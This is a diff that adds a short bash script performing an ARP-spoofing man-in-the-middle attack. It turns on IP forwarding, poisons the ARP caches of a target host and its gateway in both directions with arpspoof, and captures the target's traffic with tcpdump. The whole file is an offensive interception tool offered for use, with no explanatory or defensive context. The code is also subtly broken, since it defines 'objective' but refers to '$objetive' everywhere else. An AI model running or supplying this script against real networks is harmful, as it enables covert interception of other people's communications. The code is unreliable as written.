@@ -1,0 +1,9 @@
+#!/bin/bash
+eth=$1
+objective=$2
+gateway=$3
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+nohup arpspoof -i $eth -t $gateway $objetive &
+nohup arpspoof -i $eth -t $objetive $gateway &
+tcpdump -nni $eth "host $objetive" -s 0 and not arp
